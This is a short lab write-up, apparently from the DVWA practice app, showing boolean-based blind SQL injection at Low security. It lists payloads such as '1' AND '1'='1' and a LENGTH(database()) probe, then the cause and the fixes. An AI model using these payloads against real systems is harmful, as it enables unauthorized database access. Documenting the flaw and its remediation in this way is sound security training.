# SQL Injection (Blind) - Low

## Step 1

* Opened SQL Injection (Blind) page.
* Security level set to Low.

![01_Target_Page](images/01_Target_Page.__temp__.JPG)

## Step 2

* Tested valid user ID.

**Payload**

```sql
1
```

* User exists.

![02_valid_user](images/02_valid_user.__temp__.JPG)

## Step 3

* Tested TRUE condition.

**Payload**

```sql
1' AND '1'='1
```

* Application returned positive response.

![03_boolean_true](images/03_boolean_true.__temp__.JPG)

## Step 4

* Tested FALSE condition.

**Payload**

```sql
1' AND '1'='2
```

* Application returned negative response.

![04_boolean_false](images/04_boolean_false.__temp__.JPG)

## Step 5

* Determined database name length using boolean inference.

**Payload**

```sql
1' AND LENGTH(database())=4#
```

* Condition evaluated as TRUE.
* Database length = 4.

![05_database_length](images/05_database_length.__temp__.JPG)

## Result

* Blind SQL Injection confirmed.
* Database information can be inferred through TRUE/FALSE responses.

## Reason

* User input is directly concatenated into the SQL query.
* No prepared statements are used.

## Fix

* Use parameterized queries.
* Validate user input.
* Return generic responses.
* Apply least-privilege database permissions.
